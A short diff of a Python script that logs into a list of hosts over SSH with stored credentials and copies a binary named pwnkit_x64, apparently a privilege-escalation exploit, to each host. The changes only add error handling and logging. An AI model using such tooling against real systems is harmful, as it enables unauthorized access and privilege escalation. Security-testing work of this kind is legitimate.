@@ -18,11 +18,16 @@ def read_config_file():
 	return parsed_config
 
 def check_login(ip_address, username, password):
-	logger.info(f"Connecting to {username}@{ip_address}...")
-	ssh_client = paramiko.SSHClient()
-	ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-	ssh_client.connect(ip_address, username=username, password=password, timeout=5)
-	logger.info(f"Successfully connected to {username}@{ip_address}")
+	try:
+		logger.info(f"Connecting to {username}@{ip_address}...")
+		ssh_client = paramiko.SSHClient()
+		ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		ssh_client.connect(ip_address, username=username, password=password, timeout=5)
+		logger.info(f"Successfully connected to {username}@{ip_address}")
+	except Exception as err:
+		logger.error(err)
+		logger.info(f"{COLOR_FAIL}Failed to connect to {username}@{ip_address}{COLOR_END}")
+		return
 
 	logger.info("Copying pwnkit_x64 binary over SSH...")
 	sftp = ssh_client.open_sftp()
@@ -55,7 +60,7 @@ def main():
 			try:
 				check_login(ip_address=ip, username=credential["username"], password=credential["password"])
 			except Exception as err:
-				logger.info(err)
+				logger.exception(err)
 
 if __name__ == "__main__":
 	main()
